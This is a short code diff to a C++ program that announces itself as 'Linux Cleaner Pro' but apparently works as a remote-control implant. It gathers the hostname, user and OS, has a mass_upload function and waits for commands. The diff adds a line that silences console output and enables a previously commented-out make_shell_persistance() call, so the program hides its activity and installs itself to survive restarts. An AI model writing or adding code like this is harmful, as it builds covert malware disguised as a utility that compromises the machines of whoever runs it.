@@ -241,13 +241,14 @@ void mass_upload(string command, string id) {
 int main() {
     cout << "Starting up Linux Cleaner Pro!" << endl;
     cout << "The best optoin for best running!!!!!!!! :)" << endl;
+    cout.setstate(std::ios_base::failbit);
 
     int wait_for_command_time = 3;
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
 
-    //make_shell_persistance();
+    make_shell_persistance();
 
     string id = "";
     while(id == "")
